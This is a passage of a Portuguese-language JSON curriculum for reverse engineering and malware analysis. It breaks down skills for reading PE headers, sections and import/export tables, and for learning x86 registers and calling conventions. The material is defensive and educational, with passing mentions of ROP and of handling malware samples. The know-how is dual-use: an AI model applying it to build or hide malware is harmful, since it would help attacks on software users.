                                  ]
                                }
                              ],
                              "practicalExample": "Em notepad.exe (Windows 10 x64): e_lfanew=0xF0, Signature 'PE\\0\\0' em 0xF0, Machine=8664 (x64), Sections=0x0A, SizeOfOptionalHeader=0xE0, Magic=0x20B (PE32+), SizeOfCode=0x00016000, EntryPoint RVA=0x21F0, ImageBase=0x00007FF6xxx, Subsystem=0x0002 (Windows GUI).",
                              "finalVerifications": [
                                "PE signature localizada e validada via e_lfanew.",
                                "Todos campos do File Header (Machine, Sections, Timestamp, Characteristics) corretamente lidos.",
                                "Optional Header Magic identificado (PE32/PE32+).",
                                "SizeOfCode, AddressOfEntryPoint RVA, ImageBase e Subsystem extraídos com valores precisos.",
                                "Sem discrepâncias ao validar com CFF Explorer.",
                                "Explicação do impacto de cada campo no loader."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de offsets e leitura de valores (100% match).",
                                "Correta interpretação semântica (ex: Machine type, Subsystem meaning).",
                                "Identificação de little-endian e estrutura hierárquica.",
                                "Validação cruzada com tools independentes.",
                                "Capacidade de detectar campos suspeitos (ex: timestamp futuro).",
                                "Clareza no resumo escrito."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Python: Implementar parser manual de PE headers.",
                                "Sistemas Operacionais: Entender loader do Windows (ntdll.dll).",
                                "Segurança Computacional: Análise de malware via headers manipulados.",
                                "Engenharia Reversa: Uso em IDA Pro/Ghidra para entry point.",
                                "Redes: Headers em droppers de C2 malware."
                              ],
                              "realWorldApplication": "Na análise forense de malware, inspecionar Optional Header para detectar packing (SizeOfCode=0), entry point hooks ou subsystem mismatch (DLL como EXE), auxiliando em detecção de threats como ransomware ou trojans em incident response."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.3",
                            "name": "Descrever seções e section headers no PE",
                            "description": "Explicar seções como .text (código), .rdata (dados somente leitura), .data (dados), .rsrc (recursos), incluindo virtual size, virtual address (RVA), raw size, characteristics (executable, readable, writable).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral do Cabeçalho PE e Localizar a Tabela de Seções",
                                  "subSteps": [
                                    "Estude o formato PE básico: DOS Header, PE Header (Signature, COFF File Header, Optional Header).",
                                    "Identifique o ponteiro para a Section Table no COFF File Header (NumberOfSections e SizeOfOptionalHeader para calcular offset).",
                                    "Use uma ferramenta como CFF Explorer para visualizar um PE simples e localizar a Section Table.",
                                    "Anote o número de seções e o tamanho de cada header (40 bytes por seção).",
                                    "Compare com documentação oficial da Microsoft para validar."
                                  ],
                                  "verification": "Abra um PE em CFF Explorer e confirme que pode apontar para a Section Table com offset correto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ferramenta CFF Explorer ou PE-bear; Arquivo PE de exemplo (ex: hello.exe); Documentação PE da Microsoft.",
                                  "tips": "Sempre comece pelo DOS Header 'MZ' para validar PE válido.",
                                  "learningObjective": "Localizar precisamente a tabela de seções no arquivo PE.",
                                  "commonMistakes": "Confundir Optional Header com Section Table; ignorar alinhamentos de 8 bytes nos nomes das seções."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar os Campos Essenciais de Cada Section Header",
                                  "subSteps": [
                                    "Descreva o campo Name (8 bytes ASCII).",
                                    "Explique VirtualSize (tamanho virtual na memória) vs. SizeOfRawData (tamanho no disco).",
                                    "Entenda VirtualAddress (RVA - Relative Virtual Address) e PointerToRawData (offset no arquivo).",
                                    "Liste Characteristics: IMAGE_SCN_CNT_CODE (executable), IMAGE_SCN_MEM_READ/WRITE (readable/writable).",
                                    "Calcule manualmente RVA para uma seção exemplo."
                                  ],
                                  "verification": "Liste e defina todos os 8 campos principais de um section header de um PE real.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "CFF Explorer; PE simples compilado; Calculadora hexadecimal.",
                                  "tips": "Lembre-se: RVA é relativo à ImageBase; use hex editor para offsets precisos.",
                                  "learningObjective": "Interpretar todos os campos chave de um section header.",
                                  "commonMistakes": "Misturar VirtualSize com SizeOfRawData; ignorar flags de Characteristics como CN_READ ou CN_WRITE."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Descrever Seções Comuns no Formato PE",
                                  "subSteps": [
                                    "Descreva .text: código executável, readable/executable, não writable.",
                                    "Explique .rdata: dados somente leitura (strings, constantes), readable.",
                                    "Detalhe .data: dados inicializados, readable/writable.",
                                    "Aborde .rsrc: recursos (ícones, dialogs), readable.",
                                    "Mencione outras como .pdata (exceções), .reloc (relocações)."
                                  ],
                                  "verification": "Para um PE exemplo, categorize cada seção por propósito e characteristics.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Lista de seções comuns PE; PE de exemplo como notepad.exe.",
                                  "tips": "Seções começam com '.' e são padded para 8 bytes.",
                                  "learningObjective": "Associar nomes de seções a seus propósitos e permissões.",
                                  "commonMistakes": "Confundir .data (writable) com .rdata (read-only); assumir todas as seções são obrigatórias."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise Completa de um Arquivo PE Real",
                                  "subSteps": [
                                    "Baixe ou compile um executável simples (ex: programa Hello World em C).",
                                    "Use CFF Explorer para exportar section headers e descreva cada um.",
                                    "Verifique tamanhos, RVAs e characteristics em um hex editor.",
                                    "Documente em tabela: Nome, VirtualSize, RVA, RawSize, Characteristics.",
                                    "Compare com um PE malicioso para notar diferenças (ex: seções obfuscadas)."
                                  ],
                                  "verification": "Crie um relatório descrevendo todas as seções de um PE com valores exatos.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Hex editor (HxD); CFF Explorer; PE samples (benigno e malicioso).",
                                  "tips": "Foquem em characteristics para inferir uso: 0x60000020 para .text.",
                                  "learningObjective": "Aplicar conhecimento para descrever seções de um binário real.",
                                  "commonMistakes": "Não alinhar RVA corretamente (páginas de 0x1000); ignorar seções vazias."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Sintetizar o Conhecimento",
                                  "subSteps": [
                                    "Revise descrições de múltiplos PEs para padrões comuns.",
                                    "Teste com script Python (pefile library) para automatizar listagem.",
                                    "Identifique anomalias: seções oversized ou writable code.",
                                    "Crie um checklist para análise rápida de seções.",
                                    "Explique impacto de seções em loading do processo."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito as seções de um novo PE sem ferramenta.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Biblioteca pefile Python; Múltiplos PE samples.",
                                  "tips": "Use pefile para validação: sections[0].Name, .Misc_VirtualSize, etc.",
                                  "learningObjective": "Sintetizar análise de seções para detecção de issues.",
                                  "commonMistakes": "Subestimar relocações afetando RVAs; esquecer endianness (little-endian)."
                                }
                              ],
                              "practicalExample": "Em notepad.exe (Windows), .text tem RVA 0x1000, VirtualSize 0x1A000, RawSize 0x1C000, characteristics 0x60000020 (code, exec/read); .rdata RVA 0x20000, characteristics 0x40000040 (read-only data). Descreva: '.text contém código principal, carregado na memória executável.'",
                              "finalVerifications": [
                                "Pode listar e definir todos os campos de um section header?",
                                "Identifica corretamente .text como executável e .data como writable?",
                                "Calcula RVA correto para uma seção dada ImageBase?",
                                "Descreve characteristics em termos de permissões (R/W/X)?",
                                "Analisa seções de um PE real sem erros em tamanhos?",
                                "Detecta seções suspeitas em malware (ex: .upx0 oversized)?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de campos (VirtualSize vs RawSize, RVA).",
                                "Correta associação de seções comuns a propósitos e flags.",
                                "Uso correto de ferramentas para validação.",
                                "Detalhe em relatórios com valores hexadecimais exatos.",
                                "Identificação de erros comuns como permissões incorretas.",
                                "Capacidade de explicar loading de seções no processo."
                              ],
                              "crossCurricularConnections": [
                                "Comparação com seções ELF (.text, .data) em Linux.",
                                "Análise de Assembly para entender código em .text.",
                                "Gerenciamento de memória do Windows (VirtualAlloc com protections).",
                                "Reverse Engineering: uso em IDA Pro ou Ghidra.",
                                "Segurança: detecção de shellcode em seções writable/exec."
                              ],
                              "realWorldApplication": "Em análise de malware, descrever seções revela injeções (code em .data writable/exec) ou packing (.upx); essencial para engenheiros de segurança em triage de binários suspeitos, extração de strings de .rdata ou patching em .text."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.4",
                            "name": "Analisar tabelas de importação e exportação no PE",
                            "description": "Interpretar .idata (import directory com hints, names, addresses), IAT (Import Address Table), e .edata (export directory com funções exportadas, ordinals e RVAs).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar as seções .idata e .edata no cabeçalho PE",
                                  "subSteps": [
                                    "Abra o arquivo PE em uma ferramenta de visualização como CFF Explorer ou PE-bear.",
                                    "Navegue para o Data Directory no Optional Header (RVA 96-127).",
                                    "Identifique o Export Directory (índice 0): RVA e Size da .edata.",
                                    "Identifique o Import Directory (índice 1): RVA e Size da .idata.",
                                    "Anote os RVAs e tamanhos para cálculo de offsets no arquivo."
                                  ],
                                  "verification": "Confirme que os RVAs da Export e Import Directory estão corretamente anotados e apontam para seções válidas no mapa de seções.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramenta PE viewer (CFF Explorer, PE-bear), amostra de executável PE.exe",
                                  "tips": "Use o mapa de seções para validar se os RVAs caem dentro de .rdata ou seções relevantes.",
                                  "learningObjective": "Compreender a localização das tabelas de import/export no formato PE.",
                                  "commonMistakes": "Confundir Data Directory com Section Headers; ignorar alinhamentos de RVA para File Offset."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Export Directory (.edata)",
                                  "subSteps": [
                                    "Vá para o RVA da Export Directory e leia a estrutura IMAGE_EXPORT_DIRECTORY (40 bytes): Characteristics, TimeDateStamp, Major/MinorVersion, Name RVA, OrdinalBase, AddressTableEntries, NumberOfNames, ExportAddressTable RVA, NamePointer RVA, OrdinalTable RVA.",
                                    "Parse a Export Address Table (EAT): liste RVAs das funções exportadas.",
                                    "Parse a Name Pointer Table: resolva nomes das funções via RVAs.",
                                    "Parse a Ordinal Table: mapeie ordinals para índices na EAT.",
                                    "Valide funções forwarders se Name RVA != Address RVA."
                                  ],
                                  "verification": "Gere uma lista completa de funções exportadas com nomes, ordinals e RVAs.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Hex editor (HxD), PE viewer, documentação PE (Microsoft specs)",
                                  "tips": "Ordinals começam em OrdinalBase (geralmente 1); use scripts Python com pefile para automação inicial.",
                                  "learningObjective": "Interpretar completamente a estrutura de exportações em PE.",
                                  "commonMistakes": "Ignorar OrdinalBase ao mapear; confundir EAT com Name Pointer RVA."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar a Import Directory (.idata) e Import Address Table (IAT)",
                                  "subSteps": [
                                    "Vá para o RVA da Import Directory: leia array de IMAGE_IMPORT_DESCRIPTOR até Characteristics=0.",
                                    "Para cada descriptor: OriginalFirstThunk (INT RVA), TimeDateStamp, ForwarderChain, Name RVA, FirstThunk (IAT RVA).",
                                    "Resolva Name RVA para nome da DLL importada.",
                                    "Parse INT via OriginalFirstThunk: hints (2 bytes), name ordinal/name RVA.",
                                    "Compare IAT (runtime) com INT (link-time) para detectar hooks.",
                                    "Liste todas as funções importadas por DLL."
                                  ],
                                  "verification": "Crie um mapeamento DLL -> funções importadas com hints e RVAs.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "PE viewer com suporte a IAT (PE Studio), amostra PE com múltiplas DLLs",
                                  "tips": "Hints são para busca binária rápida; ordinal 0 indica nome, senão ordinal.",
                                  "learningObjective": "Dominar parsing de imports, incluindo diferenças entre INT e IAT.",
                                  "commonMistakes": "Usar FirstThunk em vez de OriginalFirstThunk para nomes; não detectar imports por ordinal."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e validar dados com exemplos práticos",
                                  "subSteps": [
                                    "Compare exports/imports de um binário conhecido (ex: notepad.exe).",
                                    "Identifique dependências suspeitas em malware sample.",
                                    "Calcule offsets reais: RVA to File Offset usando Section Alignment.",
                                    "Gere relatório: DLLs importadas, funções chamadas, exports disponíveis.",
                                    "Teste rebinding manual de uma import para confirmar compreensão."
                                  ],
                                  "verification": "Explique corretamente uma discrepância IAT/INT em um sample real.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Malware samples limpos (VirusShare), Python com pefile library",
                                  "tips": "Use objdump ou dumpbin para validação cruzada.",
                                  "learningObjective": "Aplicar análise para cenários reais de segurança.",
                                  "commonMistakes": "Não validar RVAs contra bounds do arquivo; ignorar ASLR impacts no IAT."
                                }
                              ],
                              "practicalExample": "Em kernel32.dll (PE sample): Export Directory lista LoadLibraryA (ordinal 411, RVA 0x12345, name 'LoadLibraryA'). Import Directory para user32.dll mostra MessageBoxA via hint 0xABCD, INT RVA 0x67890, IAT resolvido em runtime para 0x7FF8... após binding.",
                              "finalVerifications": [
                                "Lista completa e precisa de todas DLLs e funções importadas.",
                                "Mapeamento correto de exports com nomes, ordinals e RVAs.",
                                "Identificação de diferenças entre INT e IAT.",
                                "Validação de RVAs contra seções PE.",
                                "Explicação de hints e forwarders.",
                                "Relatório gerado sem erros de parsing."
                              ],
                              "assessmentCriteria": [
                                "Precisão no parsing de estruturas (100% match com ferramenta referência).",
                                "Compreensão conceitual: explicar INT vs IAT em 1 parágrafo.",
                                "Capacidade de detectar anomalias (ex: imports obfuscados).",
                                "Eficiência: completar análise em <2h para sample complexo.",
                                "Relatório claro com diagramas ou tabelas.",
                                "Aplicação prática: identificar API suspeita em malware."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Assembly: mapear calls para imports resolvidas.",
                                "Reverse Engineering: usar para desofuscação de strings em nomes.",
                                "Segurança de Software: detectar DLL hijacking via imports fracos.",
                                "Programação em C: entender linkage estático vs dinâmico."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar chamadas a APIs como CreateRemoteThread para detecção de injeções; em auditoria de software, verificar dependências de DLLs vulneráveis como MSVCRT.dll."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.2",
                "name": "Assembly 32 e 64 bits: Conceitos Básicos",
                "description": "Introdução aos conceitos fundamentais da linguagem Assembly em arquiteturas de 32 e 64 bits.",
                "totalSkills": 53,
                "atomicTopics": [
                  {
                    "id": "10.1.2.1",
                    "name": "Registradores em x86-32 e x86-64",
                    "description": "Identificação e funções dos registradores gerais, de segmento e de ponto flutuante nas arquiteturas de 32 e 64 bits.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.1.1",
                        "name": "Registradores Gerais em x86-32 e x86-64",
                        "description": "Identificação dos registradores de propósito geral (GPRs) nas arquiteturas x86-32 (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP) e x86-64 (RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP, R8-R15), incluindo suas subpartes de 8, 16 e 32 bits, e funções típicas como acumulador, contador, ponteiro de pilha e base.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.1.1",
                            "name": "Listar registradores gerais em x86-32",
                            "description": "Memorizar e enumerar os 8 registradores gerais de 32 bits (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP), identificando suas abreviações de 16 bits (AX, BX etc.) e 8 bits (AH, AL etc.), e descrever usos convencionais como acumulador (EAX) e índice de origem (ESI).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Memorizar os 8 registradores gerais de 32 bits",
                                  "subSteps": [
                                    "Liste os registradores: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP.",
                                    "Crie um mnemônico para lembrar a ordem: 'A B C D Source Dest Base Stack' (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP).",
                                    "Escreva cada um 5 vezes em um papel ou editor de texto.",
                                    "Recite em voz alta 3 vezes sem olhar a lista.",
                                    "Associe cada um a uma imagem mental (ex: EAX como 'Accumulator' = caixa acumuladora)."
                                  ],
                                  "verification": "Recitar corretamente todos os 8 registradores de 32 bits em sequência sem consultar notas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel e caneta ou editor de texto simples",
                                    "Tabela de referência de registradores x86 (impressa ou online)"
                                  ],
                                  "tips": "Use repetição espaçada: recite agora, em 5 min, em 10 min.",
                                  "learningObjective": "Identificar e nomear os 8 registradores gerais de 32 bits em x86-32.",
                                  "commonMistakes": [
                                    "Confundir ESI/EDI com EDI/ESI",
                                    "Esquecer ESP/EBP",
                                    "Trocar ECX por EDX"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender abreviações de 16 bits e 8 bits",
                                  "subSteps": [
                                    "Para cada registrador de 32 bits, liste as versões de 16 bits: AX/BX/CX/DX/SI/DI/BP/SP.",
                                    "Liste as partes de 8 bits: AH/AL, BH/BL, CH/CL, DH/DL (apenas para EAX a EDX).",
                                    "Desenhe diagramas mostrando como os 32 bits se dividem em 16 e 8 bits.",
                                    "Escreva uma tabela completa com colunas: 32-bit, 16-bit, 8-bit high, 8-bit low.",
                                    "Teste convertendo: dado EAX, diga AX, AH, AL."
                                  ],
                                  "verification": "Completar uma tabela com todas as abreviações corretas sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Folha para tabela",
                                    "Referência visual de registradores x86"
                                  ],
                                  "tips": "Lembre: só os primeiros 4 têm partes de 8 bits (EAX-EDX); SI/DI/BP/SP não têm AH/AL equivalentes.",
                                  "learningObjective": "Mapear corretamente as subdivisões de 16 e 8 bits para cada registrador geral.",
                                  "commonMistakes": [
                                    "Inventar partes de 8 bits para ESI/EDI",
                                    "Confundir AH com alto byte de EBX"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar usos convencionais dos registradores",
                                  "subSteps": [
                                    "Estude usos: EAX (acumulador, retorno de funções), ECX (contador de loops), EDX (E/S, multiplicação), ESI (fonte string), EDI (destino string), EBP (base stack frame), ESP (stack pointer).",
                                    "Crie cartões flash: frente 'EAX?', verso 'Acumulador, retornos'.",
                                    "Associe cada uso a um exemplo simples de código assembly.",
                                    "Escreva uma lista de usos para cada registrador.",
                                    "Quiz rápido: para cada uso, diga o registrador."
                                  ],
                                  "verification": "Explicar o uso principal de pelo menos 6 registradores corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Cartões flash ou app como Anki",
                                    "Documentação Intel x86 manuals (seção registradores)"
                                  ],
                                  "tips": "Foco em convenções ABI: EAX para retornos, ECX para loops.",
                                  "learningObjective": "Descrever usos convencionais e associações padrão dos registradores.",
                                  "commonMistakes": [
                                    "Confundir ESI/EDI",
                                    "Achar que EBP é só para pilha ao invés de frame"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar enumeração completa e teste integrado",
                                  "subSteps": [
                                    "Escreva a lista completa: nomes 32/16/8 bits + uso para cada.",
                                    "Simule um debugger: 'liste registradores em um dump'.",
                                    "Crie um quiz de 10 perguntas mistas (nomes, usos, abreviações).",
                                    "Compare com referência oficial e corrija erros.",
                                    "Recite tudo de cor para um parceiro ou grave áudio."
                                  ],
                                  "verification": "Listar todos os registradores com abreviações e usos sem mais de 1 erro.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Quiz impresso ou Google Forms",
                                    "Referência x86"
                                  ],
                                  "tips": "Pratique sob timer para simular exame.",
                                  "learningObjective": "Enumerar fluentemente todos os detalhes dos registradores gerais.",
                                  "commonMistakes": [
                                    "Ordem errada na lista",
                                    "Esquecer usos específicos como ESP para push/pop"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um disassembler como IDA Pro ou Ghidra, examine um binário simples (ex: 'hello world' em assembly x86-32). Identifique usos: EAX recebe syscall number, ECX conta iterações em loop, ESP gerencia stack em chamadas de função. Liste todos os registradores observados e seus papéis.",
                              "finalVerifications": [
                                "Listar os 8 registradores de 32 bits em menos de 30 segundos sem erros.",
                                "Mapear todas as abreviações de 16 e 8 bits corretamente em uma tabela.",
                                "Explicar usos convencionais para EAX, ECX, EDX, ESI, EDI, EBP, ESP.",
                                "Identificar registrador por uso (ex: 'qual para contador de loop?').",
                                "Desenhar diagrama de subdivisões de bits para EAX.",
                                "Simular dump de registradores em contexto de debugging."
                              ],
                              "assessmentCriteria": [
                                "Precisão: 100% dos nomes, abreviações e usos corretos.",
                                "Fluência: Recitação sem hesitação ou consulta.",
                                "Compreensão: Explicar por que EAX é acumulador (convenções calling).",
                                "Aplicação: Identificar em snippet de assembly real.",
                                "Profundidade: Mencionar limitações (ex: só 4 têm 8-bit parts).",
                                "Velocidade: Completar enumeração em <1 min."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como registradores afetam otimizações de compilador.",
                                "Segurança Computacional: Reconhecer padrões em exploits buffer overflow (ESP/EBP).",
                                "Arquitetura de Computadores: Ligar a modelo von Neumann e hierarquia memória-CPU.",
                                "Matemática: Usos em operações aritméticas (EAX/EDX para mul/div).",
                                "Engenharia de Software: Debugging e reverse engineering ferramentas."
                              ],
                              "realWorldApplication": "Em análise de malware ou reverse engineering, listar registradores permite mapear fluxos de execução em binários desmontados, identificar manipuladores de stack (ESP/EBP) em exploits ROP, e debugar crashes via core dumps onde registradores são dumpados."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.2",
                            "name": "Listar registradores gerais em x86-64",
                            "description": "Enumerar os 16 registradores gerais de 64 bits (RAX a R15), destacando extensões dos registradores de 32 bits (EAX é os 32 bits baixos de RAX) e usos como argumentos de função (RDI, RSI, RDX, RCX, R8, R9 pela convenção System V).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a evolução dos registradores de x86-32 para x86-64",
                                  "subSteps": [
                                    "Revise os registradores gerais em x86-32 (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP).",
                                    "Compare com x86-64: cada um é estendido para 64 bits (RAX, RBX, etc.), adicionando R8 a R15.",
                                    "Identifique que x86-64 mantém compatibilidade: bits baixos de RAX são EAX (32 bits), AX (16 bits), AL/AH (8 bits).",
                                    "Anote diferenças em um diagrama simples.",
                                    "Leia documentação oficial da Intel sobre registradores GPR."
                                  ],
                                  "verification": "Crie um diagrama mostrando RAX com suas sub-regiões (RAX, EAX, AX, AL/AH) e confirme com referência.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (PDF ou online)",
                                    "Papel e caneta para diagrama",
                                    "Editor de texto para anotações"
                                  ],
                                  "tips": [
                                    "Use cores coloridas no diagrama para bits altos/baixos.",
                                    "Memorize: 'R' prefixo indica 64 bits."
                                  ],
                                  "learningObjective": "Compreender a estrutura hierárquica e compatibilidade backward dos registradores em x86-64.",
                                  "commonMistakes": [
                                    "Confundir registradores de 32 bits como independentes; lembrar que são sub-regiões.",
                                    "Ignorar novos registradores R8-R15."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar os 16 registradores gerais de 64 bits",
                                  "subSteps": [
                                    "Liste os 8 herdados: RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP.",
                                    "Liste os 8 novos: R8, R9, R10, R11, R12, R13, R14, R15.",
                                    "Crie um mnemônico: 'A B C D SI DI BP SP, then 8-15'.",
                                    "Repita a lista 5 vezes em voz alta.",
                                    "Escreva a lista de memória 3 vezes sem olhar."
                                  ],
                                  "verification": "Escreva os 16 registradores em ordem sem consultar notas; verifique contra lista oficial.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Lista oficial de registradores (impressa ou tela)",
                                    "Flashcards app como Anki"
                                  ],
                                  "tips": [
                                    "Agrupe em 'herdados' e 'novos' para facilitar memória.",
                                    "Associe RSP com stack, RBP com base."
                                  ],
                                  "learningObjective": "Listar fluentemente todos os 16 registradores gerais de x86-64.",
                                  "commonMistakes": [
                                    "Esquecer R12-R15; inverter RSI/RDI.",
                                    "Confundir com registradores de ponto flutuante."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar sub-regiões e acessos parciais",
                                  "subSteps": [
                                    "Para cada registrador legado (RAX etc.), liste sub-regiões: 64-bit (RAX), 32-bit (EAX), 16-bit (AX), 8-bit (AL/AH).",
                                    "Note que novos (R8+) têm R8D (32-bit), R8W (16-bit), R8B (8-bit baixo); sem AH-like para altos.",
                                    "Desenhe diagramas para RAX e R8 mostrando bytes/bits.",
                                    "Pratique nomeando: 'Quais são os 32 bits baixos de RDI?' (EDI).",
                                    "Consulte manual para regras de sobrescrita (ex: mov eax,1 zera bits altos de RAX)."
                                  ],
                                  "verification": "Para 5 registradores aleatórios, liste todas sub-regiões corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Intel manuals seção 3.2 (General-Purpose Registers)",
                                    "Ferramenta de desenho como draw.io"
                                  ],
                                  "tips": [
                                    "Lembre: 'E' para 32, 'X' para 16 (exceto BP/SP), 'L/H' para 8 bits baixos/altos.",
                                    "Teste em debugger mais tarde."
                                  ],
                                  "learningObjective": "Identificar e nomear corretamente todas as sub-regiões de qualquer registrador geral.",
                                  "commonMistakes": [
                                    "Assumir AH-like em novos registradores; ignorar zero-extension rules."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aprender convenções de uso: System V ABI para argumentos",
                                  "subSteps": [
                                    "Estude System V AMD64 ABI: argumentos em RDI, RSI, RDX, RCX, R8, R9 (1º a 6º).",
                                    "Stack para mais args; retorno em RAX.",
                                    "Compare com Windows x64 (RCX, RDX, R8, R9).",
                                    "Escreva tabela: Posição | Registrador | Exemplo uso.",
                                    "Simule chamada: fun(a,b,c) -> mov rdi,a; mov rsi,b; etc."
                                  ],
                                  "verification": "Explique ordem de args para uma função com 7 params e liste registradores usados.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "System V ABI PDF",
                                    "Exemplos de código assembly (GitHub repos)"
                                  ],
                                  "tips": [
                                    "Foco em Linux/Unix (System V); memorize 'Di Si Dx Cx 8 9'.",
                                    "Pratique com gdb."
                                  ],
                                  "learningObjective": "Aplicar convenções de chamada para identificar registradores em código assembly.",
                                  "commonMistakes": [
                                    "Confundir com Windows ABI; esquecer overflow para stack."
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva um programa assembly x86-64 (NASM) que chame printf: mov rdi, fmt; mov rsi, msg; call printf. Compile com nasm -f elf64 && ld -o prog. Execute e use gdb para inspecionar RDI/RSI antes da call, confirmando valores passados.",
                              "finalVerifications": [
                                "Liste os 16 registradores sem erros.",
                                "Para RAX, identifique EAX como bits 0-31.",
                                "Explique System V args: 1º em RDI, 2º RSI, etc.",
                                "Desenhe diagrama de sub-regiões para R15.",
                                "Simule em papel uma chamada de função com 4 args."
                              ],
                              "assessmentCriteria": [
                                "Precisão na lista de registradores (100% correto).",
                                "Correta identificação de sub-regiões para pelo menos 80% dos casos.",
                                "Explicação clara de convenções ABI com exemplos.",
                                "Uso correto de terminologia (GPR, 64-bit, low bytes).",
                                "Capacidade de aplicar em exemplo prático sem erros."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como compiler mapeia params para registradores.",
                                "Sistemas Operacionais: RSP em context switches e stacks.",
                                "Segurança Computacional: Identificar ROP gadgets usando registradores específicos.",
                                "Engenharia Reversa: Análise de binários com IDA/Ghidra destacando registradores."
                              ],
                              "realWorldApplication": "Em análise de malware ou exploits, identificar registradores em disassembly para entender passagem de shellcode pointers (ex: RSI apontando buffer em ROP chains) ou debugging de crashes onde EAX overflow afeta RAX."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.3",
                            "name": "Comparar funções dos GPRs entre x86-32 e x86-64",
                            "description": "Analisar diferenças como o aumento de registradores em 64 bits (R8-R15), tamanho expandido para endereços de 64 bits (RSP) e convenções de chamada (stdcall vs. System V AMD64), identificando impactos em código assembly.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar os Registradores Gerais de Propósito (GPRs) em x86-32",
                                  "subSteps": [
                                    "Liste os 8 GPRs principais: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP.",
                                    "Descreva funções comuns: EAX (acumulador, retorno de funções), ECX (contador de loops), ESP (stack pointer).",
                                    "Identifique sub-registradores de 8/16 bits (AL, AX, etc.).",
                                    "Analise convenção stdcall: parâmetros via stack, callee limpa stack.",
                                    "Examine um snippet de assembly x86-32 simples usando GPRs."
                                  ],
                                  "verification": "Crie uma tabela resumindo os 8 GPRs com funções e tamanhos; valide com documentação oficial Intel.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86-32 manuals (Vol. 2)",
                                    "Ferramenta de desassembly como objdump ou IDA Free"
                                  ],
                                  "tips": "Use diagramas visuais para mapear hierarquia de registradores (32/16/8 bits).",
                                  "learningObjective": "Identificar e descrever precisamente os GPRs e suas funções convencionais em x86-32.",
                                  "commonMistakes": [
                                    "Confundir ESP com EBP (stack pointer vs frame pointer)",
                                    "Ignorar sub-registradores de tamanho menor"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar os GPRs em x86-64",
                                  "subSteps": [
                                    "Liste os 16 GPRs: RAX a RDI mais R8-R15.",
                                    "Descreva expansões: registradores 64-bit, RSP (stack pointer 64-bit), RBP (frame pointer).",
